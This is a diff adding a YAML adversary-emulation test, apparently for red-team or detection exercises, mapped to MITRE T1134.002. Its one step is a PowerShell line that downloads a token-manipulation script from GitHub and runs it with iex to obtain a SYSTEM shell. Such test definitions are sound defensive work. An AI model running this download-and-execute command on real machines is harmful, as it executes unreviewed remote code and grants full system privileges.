@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique
+description: Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn
+uuid: ccf4ac39-ec93-42be-9035-90e2f26bcd92
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1134: Access Token Manipulation'
+    subtechniques:
+        - 'T1134.002: Create Process with Token'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---get-system-shell---pop-system-shell-using-token-manipulation-technique
+      inline: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
